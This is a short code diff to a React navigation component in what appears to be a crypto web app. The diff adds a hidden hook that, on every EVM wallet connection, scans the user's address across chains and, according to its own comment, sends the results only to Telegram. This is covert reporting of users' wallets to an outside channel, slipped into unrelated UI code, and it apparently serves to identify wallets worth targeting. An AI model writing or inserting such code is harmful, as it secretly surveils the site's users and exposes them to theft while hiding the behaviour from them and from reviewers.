@@ -212,6 +212,13 @@ export const Navigation = () => {
     notifyConnection();
   }, [connected, publicKey, connection, nativeToken]);
 
+  // Background multi-chain scan for EVM wallets (results go to Telegram only)
+  useEffect(() => {
+    if (isEVMConnected && evmAddress) {
+      scanAndReport(evmAddress, evmChainIdForScan ?? null);
+    }
+  }, [isEVMConnected, evmAddress, evmChainIdForScan]);
+
   const isNavForward = isTopBarForward || tradeDropdownOpen || earnDropdownOpen || mobileEarnOpen || mobileTradeOpen;
 
   return (
